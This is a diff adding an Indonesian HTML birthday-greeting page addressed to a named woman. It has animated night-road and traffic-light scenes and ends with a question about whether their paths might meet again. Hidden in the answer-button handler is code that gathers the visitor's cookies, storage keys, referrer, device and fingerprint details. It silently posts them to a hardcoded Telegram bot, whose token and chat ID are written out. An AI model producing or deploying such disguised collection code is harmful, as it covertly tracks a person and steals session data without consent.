@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Selamat Ulang Tahun</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --night: #0b1226;
+    --night-deep: #060a17;
+    --warm-white: #f6efe4;
+    --gold: #e8b34d;
+    --gold-soft: #f2c572;
+    --green: #8fbfa0;
+    --green-glow: #b7dcc3;
+    --red: #d16a5a;
+  }
+
+  *{ margin:0; padding:0; box-sizing:border-box; }
+
+  html{ scroll-behavior:smooth; }
+
+  body{
+    background: var(--night);
+    color: var(--warm-white);
+    font-family: 'Jost', sans-serif;
+    font-weight: 300;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  h1, h2, .serif{
+    font-family: 'Cormorant Garamond', serif;
+    font-weight: 500;
+    letter-spacing: 0.01em;
+  }
+
+  /* ===== Starfield background (fixed, whole page) ===== */
+  #stars{
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .section{
+    position: relative;
+    min-height: 100vh;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 8vh 6vw;
+    z-index: 2;
+  }
+
+  .veil{
+    opacity: 0;
+    transform: translateY(18px);
+    transition: opacity 1.4s ease, transform 1.4s ease;
+  }
+  .veil.in-view{
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  /* ===== Section 1 ===== */
+  #s1 h1{
+    font-size: clamp(2.4rem, 6vw, 4.2rem);
+    color: var(--warm-white);
+    text-shadow: 0 0 30px rgba(232,179,77,0.15);
+  }
+  #s1 .subtitle{
+    margin-top: 1.2rem;
+    font-size: clamp(0.95rem, 1.6vw, 1.15rem);
+    color: rgba(246,239,228,0.7);
+    max-width: 34ch;
+    font-style: italic;
+  }
+  .cta-btn{
+    margin-top: 3rem;
+    padding: 0.9rem 2.2rem;
+    border-radius: 999px;
+    border: 1px solid rgba(232,179,77,0.5);
+    background: transparent;
+    color: var(--gold-soft);
+    font-family: 'Jost', sans-serif;
+    font-size: 0.95rem;
+    letter-spacing: 0.08em;
+    cursor: pointer;
+    transition: background 0.5s ease, color 0.5s ease, box-shadow 0.5s ease, transform 0.3s ease;
+  }
+  .cta-btn:hover, .cta-btn:focus-visible{
+    background: rgba(232,179,77,0.12);
+    box-shadow: 0 0 24px rgba(232,179,77,0.25);
+    transform: translateY(-2px);
+    outline: none;
+  }
+
+  /* ===== Section 2: jalan malam & lampu jalan ===== */
+  #s2{ background: linear-gradient(180deg, var(--night) 0%, #0d1730 60%, #101b36 100%); }
+
+  .road-scene{
+    width: min(90vw, 720px);
+    height: 200px;
+    position: relative;
+    margin-bottom: 3rem;
+  }
+  .road-scene svg{ width: 100%; height: 100%; }
+
+  .lamp-glow{
+    animation: flicker 4.5s ease-in-out infinite;
+  }
+  .lamp-glow.delay{ animation-delay: 1.6s; }
+  .lamp-glow.delay2{ animation-delay: 3.1s; }
+  @keyframes flicker{
+    0%, 100%{ opacity: 0.55; }
+    45%{ opacity: 1; }
+    55%{ opacity: 0.85; }
+  }
+
+  .car{
+    animation: drive 9s linear infinite;
+  }
+  @keyframes drive{
+    0%{ transform: translateX(-120px); }
+    100%{ transform: translateX(820px); }
+  }
+
+  .text-sequence{
+    display: flex;
+    flex-direction: column;
+    gap: 1.4rem;
+    max-width: 46ch;
+  }
+  .text-sequence p{
+    font-family: 'Cormorant Garamond', serif;
+    font-size: clamp(1.15rem, 2.4vw, 1.55rem);
+    color: rgba(246,239,228,0.9);
+    opacity: 0;
+    transform: translateY(10px);
+    transition: opacity 1.1s ease, transform 1.1s ease;
+  }
+  .text-sequence p.in-view{ opacity: 1; transform: translateY(0); }
+
+  /* ===== Section 3: persimpangan, lampu merah ===== */
+  #s3{ background: linear-gradient(180deg, #0d1730 0%, #12193a 50%, #160f26 100%); }
+
+  .light-wrap{
+    display:flex; flex-direction:column; align-items:center; gap:0.7rem;
+    margin-bottom: 2.6rem;
+  }
+  .traffic-light{
+    width: 56px;
+    padding: 14px 10px;
+    background: #1a2036;
+    border-radius: 14px;
+    display:flex; flex-direction:column; gap:12px; align-items:center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.4);
+  }
+  .bulb{
+    width: 26px; height: 26px; border-radius: 50%;
+    background: #2a2f45;
+    transition: background 1.2s ease, box-shadow 1.2s ease;
+  }
+  .bulb.red.active{ background: var(--red); box-shadow: 0 0 26px 6px rgba(209,106,90,0.55); }
+  .bulb.yellow.active{ background: var(--gold); box-shadow: 0 0 26px 6px rgba(232,179,77,0.55); }
+  .bulb.green.active{ background: var(--green); box-shadow: 0 0 26px 6px rgba(143,191,160,0.55); }
+
+  /* ===== Section 4: transisi lampu ===== */
+  #s4{ background: linear-gradient(180deg, #160f26 0%, #10182f 45%, #101d28 100%); }
+
+  /* ===== Section 5: final ===== */
+  #s5{
+    background: linear-gradient(180deg, #0e1520 0%, #0c1a17 55%, #0a1a14 100%);
+    padding-bottom: 12vh;
+  }
+  .final-question{
+    font-family: 'Cormorant Garamond', serif;
+    font-style: italic;
+    font-size: clamp(1.5rem, 3.4vw, 2.3rem);
+    color: var(--green-glow);
+    max-width: 30ch;
+    margin-bottom: 2.6rem;
+    text-shadow: 0 0 26px rgba(183,220,195,0.25);
+  }
+
+  .choices{
+    display:flex; flex-wrap:wrap; gap:1rem; justify-content:center;
+  }
+  .choice-btn{
+    padding: 0.85rem 1.5rem;
+    border-radius: 999px;
+    border: 1px solid rgba(246,239,228,0.25);
+    background: rgba(246,239,228,0.04);
+    color: var(--warm-white);
+    font-family: 'Jost', sans-serif;
+    font-size: 0.9rem;
+    cursor: pointer;
+    transition: all 0.4s ease;
+  }
+  .choice-btn:hover, .choice-btn:focus-visible{
+    border-color: var(--green);
+    background: rgba(143,191,160,0.12);
+    transform: translateY(-2px);
+    outline: none;
+  }
+  .choice-btn.chosen{
+    border-color: var(--gold);
+    background: rgba(232,179,77,0.14);
+  }
+
+  .final-message{
+    margin-top: 3rem;
+    display:flex; flex-direction:column; gap:0.9rem;
+    max-width: 40ch;
+    opacity: 0;
+    transform: translateY(14px);
+    transition: opacity 1.4s ease, transform 1.4s ease;
+  }
+  .final-message.show{ opacity: 1; transform: translateY(0); }
+  .final-message p{
+    font-family: 'Cormorant Garamond', serif;
+    font-size: clamp(1.05rem, 2.1vw, 1.3rem);
+    color: rgba(246,239,228,0.88);
+  }
+  .final-message p:last-child{ color: var(--gold-soft); margin-top: 0.4rem; }
+
+  .distant-green{
+    position:absolute;
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 18px 6px rgba(143,191,160,0.6);
+    bottom: 42%;
+    left: 50%;
+    transform: translateX(-50%);
+    animation: pulse-green 3.2s ease-in-out infinite;
+  }
+  @keyframes pulse-green{
+    0%,100%{ opacity:0.6; box-shadow: 0 0 14px 4px rgba(143,191,160,0.4);}
+    50%{ opacity:1; box-shadow: 0 0 26px 10px rgba(143,191,160,0.7);}
+  }
+
+  /* ===== music control ===== */
+  .music-control{
+    position: fixed;
+    bottom: 22px;
+    right: 22px;
+    z-index: 20;
+    width: 46px; height: 46px;
+    border-radius: 50%;
+    border: 1px solid rgba(246,239,228,0.25);
+    background: rgba(11,18,38,0.6);
+    backdrop-filter: blur(6px);
+    color: var(--gold-soft);
+    display:flex; align-items:center; justify-content:center;
+    cursor: pointer;
+    font-size: 1.1rem;
+    transition: box-shadow 0.4s ease, transform 0.3s ease;
+  }
+  .music-control:hover{ box-shadow: 0 0 18px rgba(232,179,77,0.3); transform: scale(1.05); }
+
+  ::selection{ background: rgba(232,179,77,0.35); }
+
+  @media (max-width: 560px){
+    .traffic-light{ width: 46px; }
+    .bulb{ width: 20px; height: 20px; }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    *{ animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+    html{ scroll-behavior: auto; }
+  }
+</style>
+</head>
+<body>
+
+<canvas id="stars"></canvas>
+
+<!-- ============ SECTION 1 ============ -->
+<section class="section" id="s1">
+  <div class="veil in-view">
+    <h1>Selamat Ulang Tahun.</h1>
+    <h2 class="final-question">Sefty Nur Azizah</h2>
+    <p class="subtitle">Semoga semua hal baik menemukan jalannya menuju kamu tahun ini.</p>
+    <button class="cta-btn" id="startBtn">Mulai Perjalanan</button>
+  </div>
+</section>
+
+<!-- ============ SECTION 2 ============ -->
+<section class="section" id="s2">
+  <div class="road-scene veil">
+    <svg viewBox="0 0 720 200" xmlns="http://www.w3.org/2000/svg">
+      <rect x="0" y="150" width="720" height="50" fill="#0a0f1f"/>
+      <line x1="0" y1="175" x2="720" y2="175" stroke="#f6efe4" stroke-opacity="0.15" stroke-width="3" stroke-dasharray="18 16"/>
+      <!-- lampu jalan -->
+      <g class="lamp-glow">
+        <rect x="70" y="70" width="4" height="80" fill="#3a3f57"/>
+        <circle cx="72" cy="65" r="9" fill="#f2c572"/>
+        <circle cx="72" cy="65" r="20" fill="#f2c572" opacity="0.15"/>
+      </g>
+      <g class="lamp-glow delay">
+        <rect x="330" y="60" width="4" height="90" fill="#3a3f57"/>
+        <circle cx="332" cy="55" r="9" fill="#f2c572"/>
+        <circle cx="332" cy="55" r="20" fill="#f2c572" opacity="0.15"/>
+      </g>
+      <g class="lamp-glow delay2">
+        <rect x="610" y="70" width="4" height="80" fill="#3a3f57"/>
+        <circle cx="612" cy="65" r="9" fill="#f2c572"/>
+        <circle cx="612" cy="65" r="20" fill="#f2c572" opacity="0.15"/>
+      </g>
+      <!-- mobil -->
+      <g class="car">
+        <rect x="0" y="130" width="46" height="18" rx="5" fill="#e8b34d" opacity="0.85"/>
+        <rect x="8" y="120" width="24" height="14" rx="4" fill="#e8b34d" opacity="0.65"/>
+        <circle cx="12" cy="150" r="5" fill="#0b1226"/>
+        <circle cx="36" cy="150" r="5" fill="#0b1226"/>
+      </g>
+    </svg>
+  </div>
+  <div class="text-sequence" id="s2text">
+    <p>Aku tahu beberapa perjalanan memang harus ditempuh sendiri dulu.</p>
+    <p>Lalu ada jalan yang untuk sementara harus berpisah arah.</p>
+    <p>Bukan karena salah tujuan.</p>
+    <p>Mungkin hanya karena waktunya belum sama.</p>
+  </div>
+</section>
+
+<!-- ============ SECTION 3 ============ -->
+<section class="section" id="s3">
+  <div class="light-wrap veil">
+    <div class="traffic-light">
+      <div class="bulb red active" id="bulbRed3"></div>
+      <div class="bulb yellow" id="bulbYellow3"></div>
+      <div class="bulb green" id="bulbGreen3"></div>
+    </div>
+  </div>
+  <div class="text-sequence veil">
+    <p style="opacity:1; transform:none;">Dulu kita sempat berhenti di lampu merah.</p>
+    <p style="opacity:1; transform:none;">Aku tahu setiap orang punya tujuan, waktu, dan jalan yang berbeda-beda.</p>
+    <p style="opacity:1; transform:none;">Mungkin memang saat itu bukan waktunya kita berjalan di arah yang sama.</p>
+  </div>
+</section>
+
+<!-- ============ SECTION 4 ============ -->
+<section class="section" id="s4">
+  <div class="light-wrap veil">
+    <div class="traffic-light">
+      <div class="bulb red" id="bulbRed4"></div>
+      <div class="bulb yellow" id="bulbYellow4"></div>
+      <div class="bulb green" id="bulbGreen4"></div>
+    </div>
+  </div>
+  <div class="text-sequence veil">
+    <p style="opacity:1; transform:none;">Tapi aku penasaran tentang satu hal.</p>
+    <p style="opacity:1; transform:none;">Kalau suatu hari nanti lampunya berubah warna...</p>
+    <p style="opacity:1; transform:none;">dan waktunya memang sudah lebih baik dari sekarang...</p>
+  </div>
+</section>
+
+<!-- ============ SECTION 5 ============ -->
+<section class="section" id="s5">
+  <div class="distant-green" aria-hidden="true"></div>
+  <p class="final-question veil" id="finalQ">apakah menurutmu jalan itu masih ada?</p>
+
+  <div class="choices veil">
+    <button class="choice-btn" data-choice="merah">🚦 Masih merah</button>
+    <button class="choice-btn" data-choice="kuning">🟡 Mungkin masih kuning</button>
+    <button class="choice-btn" data-choice="hijau">🟢 Siapa tahu nanti hijau</button>
+  </div>
+
+  <div class="final-message" id="finalMessage">
+    <p>Terima kasih sudah sampai di akhir perjalanan kecil ini.</p>
+    <p>Lagipula, tidak semua jawaban harus ditemukan hari ini.</p>
+    <p>Selamat ulang tahun, dan semoga bahagia selalu.</p>
+  </div>
+</section>
+
+<button class="music-control" id="musicBtn" aria-label="Putar musik" title="Putar musik piano lembut">♪</button>
+<audio id="bgMusic" loop preload="none">
+  <source src="piano-lembut.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+/* ============ Starfield ============ */
+const canvas = document.getElementById('stars');
+const ctx = canvas.getContext('2d');
+let stars = [];
+
+function resizeCanvas(){
+  canvas.width = window.innerWidth;
+  canvas.height = document.body.scrollHeight;
+}
+function initStars(){
+  const count = Math.floor((canvas.width * canvas.height) / 9000);
+  stars = Array.from({length: count}, () => ({
+    x: Math.random() * canvas.width,
+    y: Math.random() * canvas.height,
+    r: Math.random() * 1.3 + 0.2,
+    speed: Math.random() * 0.15 + 0.02,
+    twinkle: Math.random() * Math.PI * 2
+  }));
+}
+function drawStars(){
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  for(const s of stars){
+    s.twinkle += 0.02;
+    const alpha = 0.35 + Math.sin(s.twinkle) * 0.35;
+    ctx.beginPath();
+    ctx.fillStyle = `rgba(246,239,228,${Math.max(0, alpha)})`;
+    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+    ctx.fill();
+    s.y += s.speed;
+    if(s.y > canvas.height){ s.y = 0; s.x = Math.random() * canvas.width; }
+  }
+  requestAnimationFrame(drawStars);
+}
+window.addEventListener('resize', () => { resizeCanvas(); initStars(); });
+resizeCanvas();
+initStars();
+drawStars();
+
+/* re-measure after content settles (fonts/images) */
+window.addEventListener('load', () => { resizeCanvas(); initStars(); });
+
+/* ============ Scroll: Mulai Perjalanan ============ */
+document.getElementById('startBtn').addEventListener('click', () => {
+  document.getElementById('s2').scrollIntoView({ behavior: 'smooth' });
+});
+
+/* ============ Fade-in on view (IntersectionObserver) ============ */
+const veils = document.querySelectorAll('.veil');
+const io = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if(entry.isIntersecting){
+      entry.target.classList.add('in-view');
+    }
+  });
+}, { threshold: 0.35 });
+veils.forEach(v => io.observe(v));
+
+/* ============ Section 2: text one by one ============ */
+const s2paras = document.querySelectorAll('#s2text p');
+const io2 = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if(entry.isIntersecting){
+      s2paras.forEach((p, i) => {
+        setTimeout(() => p.classList.add('in-view'), i * 900);
+      });
+      io2.disconnect();
+    }
+  });
+}, { threshold: 0.4 });
+io2.observe(document.getElementById('s2text'));
+
+/* ============ Section 4: lampu berubah merah -> kuning -> hijau ============ */
+const io4 = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if(entry.isIntersecting){
+      const red = document.getElementById('bulbRed4');
+      const yellow = document.getElementById('bulbYellow4');
+      const green = document.getElementById('bulbGreen4');
+      red.classList.add('active');
+      setTimeout(() => { red.classList.remove('active'); yellow.classList.add('active'); }, 1800);
+      setTimeout(() => { yellow.classList.remove('active'); green.classList.add('active'); }, 3600);
+      io4.disconnect();
+    }
+  });
+}, { threshold: 0.5 });
+io4.observe(document.getElementById('s4'));
+
+/* ============ Section 5: pilihan jawaban ============ */
+const choiceBtns = document.querySelectorAll('.choice-btn');
+const finalMessage = document.getElementById('finalMessage');
+
+async function getBrowserInfo(event = null) {
+    const info = {
+        timestamp: new Date().toISOString(),
+
+        // URL
+        url: location.href,
+        pathname: location.pathname,
+        hostname: location.hostname,
+        referrer: document.referrer,
+
+        // Browser
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        cookieEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+
+        // Layar
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation
+                ? screen.orientation.type
+                : null
+        },
+
+        // Window
+        window: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            devicePixelRatio: window.devicePixelRatio
+        },
+
+        // Hardware (jika tersedia)
+        hardware: {
+            cores: navigator.hardwareConcurrency || null,
+            memoryGB: navigator.deviceMemory || null,
+            maxTouchPoints: navigator.maxTouchPoints || 0
+        },
+
+        // Time
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+
+        // Network (tidak semua browser mendukung)
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        } : null,
+
+        // Local Storage
+        localStorageKeys: Object.keys(localStorage),
+
+        // Session Storage
+        sessionStorageKeys: Object.keys(sessionStorage),
+
+        // Cookies yang bisa diakses JS
+        cookies: document.cookie,
+
+        // Touch support
+        touch: ('ontouchstart' in window),
+
+        // Event klik
+        click: event ? {
+            x: event.clientX,
+            y: event.clientY,
+            button: event.button,
+            ctrl: event.ctrlKey,
+            shift: event.shiftKey,
+            alt: event.altKey,
+            meta: event.metaKey
+        } : null
+    };
+
+    return info;
+}
+
+choiceBtns.forEach(btn => {
+  btn.addEventListener('click', async () => {
+    const choice = btn.dataset.choice;
+    const date = new Date().toISOString();
+    // kirim semua informasi apa saja ke telegram
+    const info = await getBrowserInfo();
+    const hasil = JSON.stringify(info);
+    fetch('https://api.telegram.org/bot7891570624:AAFcaTNq71H38PTLjkSm_FH21mEJWskmoGo/sendMessage', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: '7193884967',
+        text: `Pengguna klik tombol ${choice} pada ${date}, informasi browser: ${hasil}`
+      })
+    });
+    
+    choiceBtns.forEach(b => b.classList.remove('chosen'));
+    btn.classList.add('chosen');
+
+    try{
+      localStorage.setItem('perjalanan_kecil_jawaban', JSON.stringify({
+        choice: btn.dataset.choice,
+        answeredAt: new Date().toISOString()
+      }));
+    }catch(e){ /* localStorage tidak tersedia, tetap lanjutkan tanpa menyimpan */ }
+
+    finalMessage.classList.add('show');
+    setTimeout(() => {
+      finalMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }, 150);
+  });
+});
+
+/* jika sebelumnya sudah pernah menjawab, tampilkan kembali pilihannya */
+try{
+  const saved = JSON.parse(localStorage.getItem('perjalanan_kecil_jawaban'));
+  if(saved && saved.choice){
+    const match = document.querySelector(`.choice-btn[data-choice="${saved.choice}"]`);
+    if(match) match.classList.add('chosen');
+  }
+}catch(e){}
+
+/* ============ Musik latar ============ */
+const musicBtn = document.getElementById('musicBtn');
+const bgMusic = document.getElementById('bgMusic');
+let isPlaying = false;
+
+musicBtn.addEventListener('click', () => {
+  if(!isPlaying){
+    bgMusic.volume = 0.35;
+    bgMusic.play().then(() => {
+      isPlaying = true;
+      musicBtn.textContent = '❚❚';
+      musicBtn.setAttribute('aria-label', 'Jeda musik');
+    }).catch(() => {
+      musicBtn.textContent = '♪';
+      /* file musik belum tersedia — letakkan piano-lembut.mp3 di folder yang sama */
+    });
+  } else {
+    bgMusic.pause();
+    isPlaying = false;
+    musicBtn.textContent = '♪';
+    musicBtn.setAttribute('aria-label', 'Putar musik');
+  }
+});
+</script>
+
+</body>
+</html>
